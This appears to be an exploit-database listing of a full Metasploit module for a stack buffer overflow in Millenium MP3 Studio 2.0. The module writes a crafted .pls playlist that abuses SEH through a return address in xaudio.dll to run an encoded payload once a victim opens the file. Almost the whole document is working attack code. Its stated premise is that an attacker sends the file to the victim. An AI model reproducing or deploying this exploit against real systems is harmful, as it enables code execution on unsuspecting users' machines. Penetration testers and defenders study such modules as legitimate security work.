Millenium MP3 Studio 2.0 (PLS File) Universal Stack Overflow (meta)
===================================================================


# Title: Millenium MP3 Studio 2.0 (PLS File) Universal Stack Overflow (meta)
# CVE-ID: ()
# OSVDB-ID: ()
# Author: dookie
# Published: 2009-12-11
# Verified: yes

view source
print?
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Millenium MP3 Studio 2.0 (PLS File) Stack Overflow.&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack-based buffer overflow in the Millenium MP3 Studio 2.0.
                    An attacker must send the file to victim and the victim must open the file.
                    Alternatively it may be possible to execute code remotely via an embedded
                    PLS file within a browser, when the PLS extention is registered to Millenium MP3 Studio.
                    This functionality has not been tested in this module.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [ &#039;Molotov &#039;, &#039;dookie&#039; ],
            &#039;Version&#039;        => &#039;$Revision: 7724 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/10240&#039; ],
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 800,
                    &#039;BadChars&#039; => "\x00\x0a\x0d\x3c\x22\x3e\x3d",
                    &#039;EncoderType&#039;   => Msf::Encoder::Type::AlphanumMixed,
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows Universal&#039;, { &#039;Ret&#039; => 0x10015593 } ], #p/p/r in xaudio.dll
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;28 Nov 2009&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;millenium.pls&#039;]),
                ], self.class)
 
    end
 
    def exploit
         
        header = "[playlist]\r\n"
        header << "NumberOfEntries=1\r\n"
        header << "File1=http://"    
 
        sploit = rand_text_alpha_upper(4103)
        sploit << "\xeb\x1c\x90\x90"
        sploit << [target.ret].pack(&#039;V&#039;)
        sploit << payload.encoded
        sploit << rand_text_alpha_upper(1000)
 
        filepls = header + sploit
         
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        file_create(filepls)
 
    end
 
end



